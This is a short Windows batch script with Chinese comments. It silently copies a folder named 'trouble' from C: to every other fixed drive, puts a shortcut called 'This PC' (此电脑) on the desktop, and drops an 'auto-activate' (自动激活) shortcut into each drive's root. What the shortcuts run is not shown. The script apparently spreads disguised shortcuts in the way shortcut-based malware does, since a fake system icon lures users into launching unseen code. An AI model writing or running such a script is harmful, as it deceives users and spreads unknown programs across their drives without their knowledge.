@echo off
setlocal enabledelayedexpansion

:: 1. 创建目标目录（静默）
md D:\trouble 2>nul

:: 2. 定义源目录和逻辑
set "SOURCE=C:\trouble"
set "SHORTCUTS=此电脑.lnk 自动激活.lnk"

:: 3. 枚举所有非系统固定硬盘并复制
for /f "tokens=2 delims=," %%D in ('wmic logicaldisk where drivetype=3 get deviceid^,providername /format:csv') do (
    set drive=%%D
    if /i "!drive!" neq "C:" (
        xcopy "%SOURCE%\*" "!drive!\trouble\" /e/i/y/q
    )
)

:: 4. 复制桌面快捷方式（静默处理中文路径）
xcopy "%SOURCE%\此电脑.lnk" "%USERPROFILE%\Desktop\此电脑.lnk" /i/y/q

:: 5. 复制自动激活快捷方式到所有硬盘根目录
for /f "tokens=2 delims=," %%D in ('wmic logicaldisk where drivetype=3 get deviceid^,providername /format:csv') do (
    set drive=%%D
    if /i "!drive!" neq "C:" (
        xcopy "%SOURCE%\自动激活.lnk" "!drive!\自动激活.lnk" /i/y/q
    )
)

exit /b 0